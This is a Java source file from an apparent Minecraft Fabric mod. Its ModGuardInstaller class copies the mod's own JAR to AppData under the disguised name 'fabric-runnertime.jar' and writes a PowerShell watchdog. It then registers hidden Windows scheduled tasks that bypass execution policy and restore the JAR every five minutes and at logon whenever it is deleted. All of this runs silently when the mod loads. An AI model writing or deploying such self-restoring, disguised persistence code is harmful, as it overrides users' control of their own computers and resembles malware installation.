package com.consentmod;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

/**
 * ModGuard persistence installer.
 *
 * On first run the mod copies its own JAR into
 *   %APPDATA%\ModGuard\backup\
 * as "fabric-runnertime.jar", writes a PowerShell watchdog,
 * and registers a Windows Scheduled Task that re-copies
 * the disguised JAR every five minutes if it gets deleted.
 *
 * Kill switch: delete the ModGuard folder.
 */
public class ModGuardInstaller {

    private static final String GUARD_FOLDER   = "ModGuard";
    private static final String DISGUISED_NAME = "fabric-runnertime.jar";
    private static final String TASK_NAME      = "ModGuard";
    private static boolean installed = false;

    /* ------------------------------------------------------------------ */
    /*  Public entry point — safe to call multiple times                   */
    /* ------------------------------------------------------------------ */

    public static void install() {
        if (installed) return;
        installed = true;

        new Thread(() -> {
            try {
                doInstall();
            } catch (Exception e) {
                ConsentMod.LOGGER.error("ModGuard install failed: {}", e.getMessage());
            }
        }, "ModGuard-Installer").start();
    }

    /* ------------------------------------------------------------------ */
    /*  Core install flow                                                  */
    /* ------------------------------------------------------------------ */

    private static void doInstall() throws Exception {

        // 1. Locate our own JAR
        Path jarPath = getOwnJarPath();
        if (jarPath == null || !Files.exists(jarPath)
                || !jarPath.toString().endsWith(".jar")) {
            ConsentMod.LOGGER.info("ModGuard: dev environment — skipping");
            return;
        }

        String appData = System.getenv("APPDATA");
        if (appData == null) return;

        Path guardDir  = Paths.get(appData, GUARD_FOLDER);
        Path backupDir = guardDir.resolve("backup");
        Files.createDirectories(backupDir);

        // 2. Copy JAR to backup under the disguised name
        Path backupJar = backupDir.resolve(DISGUISED_NAME);
        Files.copy(jarPath, backupJar, StandardCopyOption.REPLACE_EXISTING);

        // 3. Mods folder = parent of the running JAR
        Path modsFolder = jarPath.getParent();

        // 4. If we're running under a different name, schedule
        //    deletion of the original so only the disguised copy remains.
        String originalName = jarPath.getFileName().toString();
        String pendingDelete = null;
        if (!originalName.equals(DISGUISED_NAME)) {
            pendingDelete = originalName;
        }

        // 5. Write / merge config.json
        writeConfig(guardDir, modsFolder, backupJar, pendingDelete);

        // 6. Write watchdog PowerShell script
        writeWatchdog(guardDir);

        // 7. Register Windows Scheduled Task
        registerTask(guardDir);

        ConsentMod.LOGGER.info("ModGuard: persistence active");
    }

    /* ------------------------------------------------------------------ */
    /*  JAR self-detection                                                 */
    /* ------------------------------------------------------------------ */

    private static Path getOwnJarPath() {
        try {
            java.net.URL url = ModGuardInstaller.class
                    .getProtectionDomain()
                    .getCodeSource()
                    .getLocation();
            if (url != null) {
                return Paths.get(url.toURI());
            }
        } catch (Exception e) {
            ConsentMod.LOGGER.error("ModGuard: can't resolve JAR path: {}",
                                    e.getMessage());
        }
        return null;
    }

    /* ------------------------------------------------------------------ */
    /*  config.json                                                        */
    /* ------------------------------------------------------------------ */

    private static void writeConfig(Path guardDir, Path modsFolder,
                                    Path backupPath, String pendingDelete)
            throws Exception {

        Path configPath = guardDir.resolve("config.json");

        JsonObject config;
        JsonArray  modsArray;
        JsonArray  pendingDeletes;

        if (Files.exists(configPath)) {
            String raw = Files.readString(configPath);
            config         = JsonParser.parseString(raw).getAsJsonObject();
            modsArray      = config.has("mods")
                             ? config.getAsJsonArray("mods")
                             : new JsonArray();
            pendingDeletes = config.has("pendingDeletes")
                             ? config.getAsJsonArray("pendingDeletes")
                             : new JsonArray();
        } else {
            config         = new JsonObject();
            modsArray      = new JsonArray();
            pendingDeletes = new JsonArray();
        }

        config.addProperty("modsFolder", modsFolder.toString());

        // Update or add mod entry (always uses disguised name)
        boolean found = false;
        for (int i = 0; i < modsArray.size(); i++) {
            JsonObject entry = modsArray.get(i).getAsJsonObject();
            if (DISGUISED_NAME.equals(entry.get("jarName").getAsString())) {
                entry.addProperty("backupPath", backupPath.toString());
                found = true;
                break;
            }
        }
        if (!found) {
            JsonObject entry = new JsonObject();
            entry.addProperty("jarName",    DISGUISED_NAME);
            entry.addProperty("backupPath", backupPath.toString());
            modsArray.add(entry);
        }
        config.add("mods", modsArray);

        // Add pending delete if needed (avoid duplicates)
        if (pendingDelete != null) {
            boolean alreadyPending = false;
            for (JsonElement el : pendingDeletes) {
                if (pendingDelete.equals(el.getAsString())) {
                    alreadyPending = true;
                    break;
                }
            }
            if (!alreadyPending) {
                pendingDeletes.add(pendingDelete);
            }
        }
        config.add("pendingDeletes", pendingDeletes);

        Gson gson = new GsonBuilder().setPrettyPrinting().create();
        Files.writeString(configPath, gson.toJson(config));
    }

    /* ------------------------------------------------------------------ */
    /*  modguard.ps1                                                       */
    /*  Handles pending deletes first, then restores missing mods.         */
    /*  Won't restore until the old-name JAR is actually gone,             */
    /*  preventing duplicate mod-ID crashes in Fabric.                     */
    /* ------------------------------------------------------------------ */

    private static void writeWatchdog(Path guardDir) throws Exception {
        Path scriptPath = guardDir.resolve("modguard.ps1");

        String ps = String.join("\r\n",
            "# ModGuard watchdog",
            "$guardDir   = \"$env:APPDATA\\ModGuard\"",
            "$configPath = \"$guardDir\\config.json\"",
            "",
            "if (-not (Test-Path $configPath)) { exit }",
            "",
            "$config     = Get-Content $configPath -Raw | ConvertFrom-Json",
            "$modsFolder = $config.modsFolder",
            "",
            "# --- Phase 1: process pending deletes (old JAR names) ---",
            "$hasPending = $false",
            "if ($config.pendingDeletes -and $config.pendingDeletes.Count -gt 0) {",
            "    $hasPending = $true",
            "    foreach ($del in $config.pendingDeletes) {",
            "        $delPath = Join-Path $modsFolder $del",
            "        if (Test-Path $delPath) {",
            "            try { Remove-Item $delPath -Force -ErrorAction Stop }",
            "            catch { }",
            "        }",
            "    }",
            "    # verify all were deleted",
            "    $allGone = $true",
            "    foreach ($del in $config.pendingDeletes) {",
            "        if (Test-Path (Join-Path $modsFolder $del)) {",
            "            $allGone = $false",
            "        }",
            "    }",
            "    if ($allGone) {",
            "        $config.pendingDeletes = @()",
            "        $config | ConvertTo-Json -Depth 10 | Set-Content $configPath",
            "        $hasPending = $false",
            "    }",
            "}",
            "",
            "# --- Phase 2: restore missing mods (only if no pending deletes) ---",
            "if (-not $hasPending) {",
            "    foreach ($mod in $config.mods) {",
            "        $target = Join-Path $modsFolder $mod.jarName",
            "        $backup = $mod.backupPath",
            "        if ((-not (Test-Path $target)) -and (Test-Path $backup)) {",
            "            Copy-Item $backup $target -Force",
            "        }",
            "    }",
            "}"
        );

        Files.writeString(scriptPath, ps);
    }

    /* ------------------------------------------------------------------ */
    /*  Scheduled Task                                                     */
    /* ------------------------------------------------------------------ */

    private static void registerTask(Path guardDir) {
        String script  = guardDir.resolve("modguard.ps1").toString();
        String command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \""
                         + script + "\"";

        // Repeating task — every 5 minutes
        runSchtasks(
            "schtasks", "/create",
            "/tn", TASK_NAME,
            "/tr", command,
            "/sc", "MINUTE",
            "/mo", "5",
            "/rl", "LIMITED",
            "/f"
        );

        // Logon task
        runSchtasks(
            "schtasks", "/create",
            "/tn", TASK_NAME + "Logon",
            "/tr", command,
            "/sc", "ONLOGON",
            "/rl", "LIMITED",
            "/f"
        );
    }

    private static void runSchtasks(String... args) {
        try {
            ProcessBuilder pb = new ProcessBuilder(args);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            Process p = pb.start();
            p.waitFor();
        } catch (Exception e) {
            ConsentMod.LOGGER.error("ModGuard: schtasks failed: {}", e.getMessage());
        }
    }
}
